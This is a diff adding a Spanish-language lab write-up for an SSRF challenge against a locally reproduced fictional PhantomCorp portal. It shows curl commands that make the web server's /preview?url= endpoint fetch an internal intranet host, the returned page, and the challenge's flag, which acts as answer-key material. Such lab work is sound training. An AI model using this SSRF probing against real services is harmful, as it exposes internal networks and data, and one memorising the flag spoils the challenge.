@@ -1,0 +1,23 @@
+# Lab Extra (SSRF) — R2: descubrir la intranet en la red interna (Guadalupe)
+# Reproducido local: web/server.py (portal :8080, panel 127.0.0.1:9000) +
+# intra/server.py (:8081), equivalentes a phantomcorp (labnet+internalnet)
+# y phantomcorp-intra (internalnet). El pedido a la intranet lo hace EL WEB
+# vía /preview?url=  (SSRF: el atacante nunca toca la intranet directo).
+
+## Sin ruta directa a la intranet desde el atacante (conceptual / Docker):
+$ curl -s --max-time 3 http://phantomcorp-intra/      # => timeout: no hay ruta
+
+## R2 — pedir la intranet a través del server (SSRF a la raíz):
+$ curl -sS -G --max-time 5 --data-urlencode 'url=http://phantomcorp-intra/' http://phantomcorp/preview
+<h3>Previsualizacion de http://phantomcorp-intra/</h3><hr>
+<h1>Intranet PhantomCorp</h1>
+<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
+<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
+<ul>
+  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
+  <li><a href="/salud">estado del servicio</a></li>
+</ul>
+
+# Flag R2: FLAG{ssrf_intranet_descubierta}  (sha256 verificado contra retos.manifest)
+# El nombre interno sigue el patrón phantomcorp-* ya visto en otros labs.
+# La petición la hizo el server (DMZ), que sí está en internalnet; no el atacante.
